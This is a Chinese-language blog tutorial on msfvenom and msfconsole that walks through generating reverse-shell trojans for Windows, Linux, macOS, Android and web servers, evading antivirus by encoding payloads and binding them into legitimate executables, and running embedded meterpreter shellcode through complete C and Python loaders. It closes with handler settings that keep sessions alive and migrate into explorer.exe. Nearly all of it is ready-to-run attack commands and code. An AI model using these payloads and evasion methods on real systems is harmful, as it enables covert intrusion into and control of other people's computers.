---
title: "Msfvenom使用小结"
date: 2020-01-15T13:30:15+08:00
draft: false
tags: ['工具使用']
categories: ['总结']
---
刚好看了一个公众号发了关于免杀的,就想着先了解下msfvenom这个生成木马的工具!

<!--more-->



# Msfvenom使用小结

###  0x01 msfvenom简介:

​		msfvenom是metasploit-framework中用来生成攻击载荷的一款软件,它替代了早期版本的msfpayload和msfencoder。安装了metasploit就会包含这个工具!

### 0x02 msfvenom命令补全

msfvenom参数和命令很多，各种payload和encoder经常让人眼花缭乱，特别是对英语不好的人来说有些命令可能很容易忘记。所以`Green_m`大佬写了一个zsh插件，可以自动化的补全msfvenom命令，安装后就可以使用tab键补全了(就像linux命令一样可以直接按tab键补全剩余的)

插件安装步骤:

https://www.cnblogs.com/sym945/p/12021829.html

问题解决:

https://blog.csdn.net/weixin_43578492/article/details/102987686

### 0x03 msfvenom使用:

#### 1、参数介绍:

![image-20200109143830075.png](https://ae01.alicdn.com/kf/U9fa2ad202d2b4dd8a717aa52f6fb7ea6c.png)

##### (1) 中文版解释:

```
Options:
    -l, --list            <type>        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等
    -p, --payload         <payload>     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
        --list-options                  # 列出--payload <value> 的标准，高级和规避选项
    -f, --format          <format>      # 指定 Payload 的输出格式(使用 --list formats 列出)
    -e, --encoder         <encoder>     # 指定使用的 Encoder (使用 --list encoders 列出)
        --sec-name        <value>       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串
        --smallest                      # 使用所有可用的编码器生成最小的payload
        --encrypt         <value>       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)
        --encrypt-key     <value>       # 用于加密的密钥
        --encrypt-iv      <value>       # 加密的初始化向量
    -a, --arch            <arch>        # 指定目标系统架构(使用 --list archs  列出)
        --platform        <platform>    # 指定目标系统平台 (使用 --list platforms 列出)
    -o, --out             <path>        # 保存payload文件
    -b, --bad-chars       <list>        # 设置需要在 Payload 中避免出现的字符，如： '\x00\xff'
    -n, --nopsled         <length>      # 指定 nop 在 payload 中的数量
    -s, --space           <length>      # 设置未经编码的 Payload 的最大长度
        --encoder-space   <length>      # 编码后的 Payload 的最大长度
    -i, --iterations      <count>       # 设置 Payload 的编码次数
    -c, --add-code        <path>        # 指定包含一个额外的win32 shellcode文件
    -x, --template        <path>        # 指定一个特定的可执行文件作为模板
    -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行
    -v, --var-name        <value>       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
    -t, --timeout         <second>      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）
    -h, --help                          # 帮助
```

##### (2) 获取相关信息的一些命令:

###### a. 查看其支持的一些选项

```
msfvenom -l payload                            //查看msfvenom支持的payload
			encoders 						   //查看msfvenom支持的encoders(编码器)
			nops							   //查看msfvenom支持的空字段模块(常用于免杀)
			platforms						   //查看msfvenom支持的系统平台
			archs                              //查看msfvenom支持的系统架构
			encrypt                            //查看msfvenom支持的加密方式
			formats                            //查看msfvenom支持的所有可用的有效载荷格式
```

效果:

![image-20200109155707602.png](https://ae01.alicdn.com/kf/U5648cc81d3c244e993c37ddfe21c4a4eI.png)

并没有截取完整 ,还有好多

##### b. 获取某个payload的详细信息

(可以用来查看使用该payload时需要设置哪些参数)

```
msfvenom --payload windows/meterpreter/reverse_tcp --list-options
```

效果(图中Required为yes的是必须要设置的,):

![image-20200109160427518.png](https://ae01.alicdn.com/kf/Ube7a165051e24a12b889a12c57d41cb1J.png)

###### 常见的一些payload解释:

```
1、reverse_tcp
	这是一个基于TCP的反弹shell，
2、reverse_http
	基于http方式的反向连接，在网速慢的情况下不稳定。
3、reverse_https
	基于https方式的反向连接，在网速慢的情况下不稳定。
4、bind_tcp
	这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。
5、reverse_tcp_rc4
	利用rc4对传输的数据进行加密，密钥在生成时指定，在监听的服务端设置相同的密钥。就可以在symantec眼皮下执行meterpreter。
	
反向连接:  就是攻击机开启一个端口,然后让目标机器去连接.(通常用于外围渗透)
正向连接:  就是在目标机器上开启一个端口.然后我们攻击机去连接.(通常用于内网渗透)
```

**-p 参数也支持使用 - 作为值来从标准输入中读取自定义的 Payload**

```
cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
```

##### c. 获取msfvenom支持的输出格式:

```
msfvenom  -f --help-formats
```

###### 可执行的格式:

```
asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-small、hta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、vba、vba-exe、vba-psh、vbs、war
```

###### shellcode格式:

```
bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript
```

#### 2、payload生成:

在使用msfvenom生成payload的时候,  -p和-f  参数是必选的,其他参数是可选的.

##### 简单案例:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=9999 -f exe > 1.exe 

参数解释:
		-p            指定使用的payload(也就是说我们生成的马是使用了这个payload生成的)
		LHOST(本机ip)、LPORT(本机端口)   这个是该payload需要设置的参数(可以通过--list-options)
		-f            指定生成文件的格式	
		>             将生成的文件重定向到某个文件(也可以使用-o选项替代)
```

##### (1) 各个平台生成二进制格式的payload:

###### windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=9999 -a x86 --platform Windows -f exe > shell.exe

注释:
	使用该payload默认是生成32位的程序,如需生成64位的程序请使用下面的payload.
	
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=9999 -f exe > shell.exe

问题:
	为什么使用第一种payload生成的马在64位操作系统也可以正常运行?
答案:
	64位系统能兼容大部分32位的软件,所以64位的机器也可以不使用x64 payload
```

###### Linux

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=9999 -a x86 --platform Linux -f elf > shell.elf
```

###### Mac

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=9999 -a x86 --platform osx -f macho > shell.macho
```

###### Android

```
msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=9999 -f raw > shell.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 R > test.apk
```

###### Powershell

```
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.2 LPORT=9999 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1  
```

##### (2) 生成各平台下的shellcode:

###### Linux

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=9999 -f <编程语言类型>
```

###### Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=9999 -f <编程语言类型>
```

###### Mac

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=9999 -f <编程语言类型>
```

shellcode生成后无法直接使用,需要编写shellcode加载器来配合运行(可以百度各语言的shellcode加载器)

##### (3) Web常用的payloads:

###### PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

###### ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f asp > shell.asp
```

###### JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw > shell.jsp
```

###### WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f war > shell.war
```

###### nodejs

```
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw -o shell.js
```

**使用方法**: 将生成的脚本放置到网站目录下,然后浏览器访问该文件即可执行该文件!

**注意:**这样获得的shell并不稳定,经常会容易中断!

##### (4) 各种语言的脚本

**这样生成的payload使用方法:**

​		将脚本里面的内容全部复制出来然后执行!

###### Python

```
第一种Linux下使用python反弹一个cmd形式的shell:
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.223 LPORT=9999 -f raw > shell.py

第二种反弹一个meterpreter形式的shell(windows|Linux都可以):
msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw > shell.py
```

###### Bash

```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.223 LPORT=9999 -f raw > shell.sh
```

###### Perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.223 LPORT=9999 -f raw > shell.pl
```

###### Lua

```
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.223 LPORT=9999 -f raw -o shell.lua
```

###### Ruby

```
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw -o shell.rb
```

### 0x04 msfvenom常用的免杀套路:

#### 1、自编码处理:

使用   msfvenom --list encoders   可以查看自带的所有编码器:

![image-20200115102647319.png](https://ae01.alicdn.com/kf/U394694329c104bdb9e1719c2535a19f28.png)

```
从图中可以看到Rank为杰出的是  x86/shikata_ga_nai  和   cmd/powershell_base64 这俩个编码器了,而我们在免杀中最常用的就是x86/shikata_ga_nai这个编码器了
```

##### 案例:

使用x86/shikata_ga_nai编码器生成payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -e x86/shikata_ga_nai -b "\x00" -i 30 -f exe -o payload1.exe

参数解释:
    -p     指定payload
    -e     指定编码器
    -b     指定生成的payload中不包含的字符
    -i     指定编码的次数
    -f     指定木马文件输出的格式
    -o     指定保存的位置及文件名
里面存在很多\x00这个在字符串拷贝的时候会被截断，所以我们需要通过编码的方式去掉这些\x00
```

##### 效果:

![image-20200115103117236.png](https://ae01.alicdn.com/kf/U0ed7a0ba72dd43b28ad1ee3c5d064948L.png)

可以正常上线,但现在基本大多数的杀毒软件都会杀.

```
shikata_ga_nai编码技术是多态的是成payload文件都不一样，有时生成的文件会被查杀，有时却不会。并不是编码次数越多越免杀!
```

#### 2、捆绑处理:

就是指定一个自定义的可执行文件作为模板,然后将payload嵌入其中.

##### 案例:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999  -x net.exe  -f exe -o payload2.exe

参数解释:
  -x      指定模板文件

默认情况下，msfvenom 使用保存在目录 msf/data/templates 下的模板文件。如果你想要选择自己的模板，你可以使用 -x 参数来指定
./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
请注意：如果你想使用一个自定义的基于 64 位操作系统的模板，那么请将 -f 参数中的 exe 修改为 exe-only
./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/

宿主程序并不会启动，如果想隐蔽木马文件让用户察觉不出来宿主程序有问题的话，则要在生成木马的那段代码中添加 -k 选项，此意为攻击载荷会在一个独立的进程中启动而源宿主程序的运行不受影响。但是，目前这仅适用于较老的Windows机器，如 x86 Windows XP。
```

##### 效果:

![image-20200115103918128.png](https://ae01.alicdn.com/kf/U595ff8aa1a824cb09f347b5b53806faci.png)

可以看到跟原文件是一毛一样的,运行测试:

![image-20200115103929860.png](https://ae01.alicdn.com/kf/Ua86967f727134c3680eaa34a231f3d0f6.png)

可以正常上线,但是为什么运行程序后不会正常打开原文件?     基本的杀软也都会拦截.

#### 3、捆绑加编码:

将前面的俩种方法结合:

##### 案例:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -e x86/shikata_ga_nai -x net.exe  -i 30 -f exe -o payload3.exe
```

##### 效果:

![image-20200115111509247.png](https://ae01.alicdn.com/kf/U4fe58d8b79f94c3fbed271b6283564b6N.png)

可以正常上线,但还是会被杀.切换模板文件为微软自带的一些exe文件会不容易被360杀(测试过几次)

#### 4、多重编码处理:

使用管道让msfvenom使用不同的编码器进行编码:

##### 案例:

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.1.223 LPORT=3333 -f raw | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 10 -x net.exe -f exe > payload4.exe

解释:
使用管道让msfvenom对攻击载荷多重编码，先用shikata_ga_nai编码20次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成以payload4.exe为模板的可执行文件。
```

##### 效果:

就是根本无法运行,尴尬了,这也是不怎么用这个的原因吧

#### 5、生成c语言的shellcode

生成一段c语言的shellcode,然会写加载器加载,最后编译成exe

##### 案例:

###### (1) 生成shellcode:

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.1.223 LPORT=3333 -e x86/shikata_ga_nai -i 15 -b '\x00\'  -f c -o payload.c
```

###### (2) 加载器:

这个加载器是网上找到的,还有很多类似的,会c语言的大家还可以自己写一个!

```
#include "windows.h"  
#include "stdio.h"  
  
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  // 隐藏控制台窗口显示
#pragma comment(linker,"/INCREMENTAL:NO")                                     // 减小编译体积
#pragma comment(linker, "/section:.data,RWE")   
//shellcode在生成payload时选择c即可  
  
unsigned char shellcode[]=  
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01\x84"
"\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
//将这段替换成自己生成的即可使用
   
int main()  
{  
    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
    memcpy(Memory, shellcode, sizeof(shellcode));  
    ((void(*)())Memory)();  
}  
```

##### (3) C语言编译环境配置:

a. 在windows上借助MinGW工具安装c/c++编译器

下载地址：[https://sourceforge.net/projects/mingw/](https://sourceforge.net/projects/mingw/])

b. 打开后这个样子:

![image-20200115112534243.png](https://ae01.alicdn.com/kf/U6bfc010ba1c84242b90986208a6670abn.png)

c. 然后找到mingw32-gcc.bin, mingw32-gcc-g++.bin, mingw32-gdb.bin这三个,选中后点击Installation->Apply all changes.

```
三个文件的作用:
	第一个是c语言文件的编译器，第二个是c++的，第三个是用来调试编译后文件的。
```

d. 等待安装完后,找到我们MinGW的安装路径,将其的bin目录所在路径添加到环境变量中:

![image-20200115112549995.png](https://ae01.alicdn.com/kf/Uceac33fbc69944009c317c0c7c60d01b2.png)

e. 然后我们打开cmd,运行gcc验证下:

![image-20200115112604141.png](https://ae01.alicdn.com/kf/U459b3d5a8358451b9ee99b505a1a6582I.png)

提示我们没有输入文件,说明我们的环境变量配置成功了!

f. 安装windows SDK:

https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk

e. 进行编译:

```
gcc -static-libstdc++ -static-libgcc  payload2.c -o 123.exe

注意不添加-static-libstdc++ -static-libgcc的话,在没有编译环境的机器上运行会报缺少dll.
```

##### 参考文章:

https://blog.csdn.net/qq_28581077/article/details/81380341

#### 6、生成python的shellcode:

生成一段python的shellcode然后写一个加载器,再利用pywin32打包成exe

##### 案例:

###### (1) 生成python的shellcode:

```
msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.1.132  -f python -o payload.py 

这里还可以使用-v 来指定shellcode的变量名,若不指定默认为buf
```

###### (2) 安装pywin32和pyinstaller

###### (3) 用来免杀的python脚本:

```
from ctypes import *
import ctypes
# length: 891 bytes

buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
buf += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
buf += b"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01\xdf\x68\x02"
buf += b"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
buf += b"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
buf += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
buf += b"\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
buf += b"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
buf += b"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
buf += b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
buf += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
buf += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
buf += b"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
buf += b"\x53\xff\xd5"
//将这段替换为自己生成的即可使用

#libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
   buf = c_char_p(buffer)
   size = len(buffer)
   addr = libc.valloc(size)
   addr = c_void_p(addr)
   if 0 == addr: 
       raise Exception("Failed to allocate memory")
   memmove(addr, buf, size)
   if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
       raise Exception("Failed to set protection on buffer")
   return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()   
if whnd != 0:
      if 666==666:
             ctypes.windll.user32.ShowWindow(whnd, 0)   
             ctypes.windll.kernel32.CloseHandle(whnd)
print ".................................."*666
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                       ctypes.c_int(len(shellcode)),
                                         ctypes.c_int(0x3000),
                                         ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                    buf,
                                    ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
```

###### (4) 利用pywin32打包成exe文件:

进入到pyinstaller所在目录(默认安装后在Scripts目录下),然后运行:

![image-20200115113932194.png](https://ae01.alicdn.com/kf/U0a356482e19e49d197201a4209094287U.png)

参数解释:

```
-F:输出为单个文件(会把所有的第三方依赖、资源和代码均被打包进该exe内)
-i:指定图标
-w:隐藏控制台

pyinstaller参数可参考:
https://blog.csdn.net/weixin_39000819/article/details/80942423
```

运行后等待结束会在dist目录下生成一个exe文件(就是我们打包好的免杀马):

![image-20200115114000664.png](https://ae01.alicdn.com/kf/Ua769bfc1d09745ea8a48e9cffdc0010bt.png)

生成的exe:

![image-20200115114010720.png](https://ae01.alicdn.com/kf/U1064f9812bcb44b69895bc46be2871ceM.png)

运行后什么也不显示,但是可以成功上线,是相当隐蔽的.

这个目前还可以免杀,不过是静态的!它执行一些危险的命令杀毒软件会拦截!

### 0x05 msfconsole使用小技巧

msfvenom生成了木马文件,我们就可以来使用msfconsole来获取其反弹的shell.

#### 举例:

##### 1、最简单的使用:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.81.160
set LPORT 9999
exploit

这里要注意的是payload、LHOST和LPORT要与msfvenom生成马时指定的一样
```

##### 2、其他一些小技巧:

###### (1) 防止一些seession刚刚连接就断开

```
msf exploit(multi/handler) >set ExitOnSession false   //可以在接收到seesion后继续监听端口，保持侦听。
```

###### (2)  防止session意外退出:

```
msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0

msf5 exploit(multi/handler) > set SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭
```

###### (3) handler后台持续监听

``` 
msf exploit(multi/handler) > exploit -j -z

-j为后台任务，-z为持续监听，使用Jobs命令查看和管理后台任务。jobs -K可结束所有任务。
```

###### (4) 上线后自动迁移进程到explorer.exe

```
set autorunscript migrate -n explorer.exe
```

也可以在使用msfvenom生成马的时候指定:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o  shell.exe

解释:
PrependMigrate=true PrependMigrateProc=explorer.exe 获取shell后,将自动迁移到另一个进程 自动注入进程explorer.exe
```

###### (5) 快捷的建立监听的方式:

``` 
msf5 > handler -H 192.168.1.223 -P 9999 -p windows/meterpreter/reverse_tcp
```

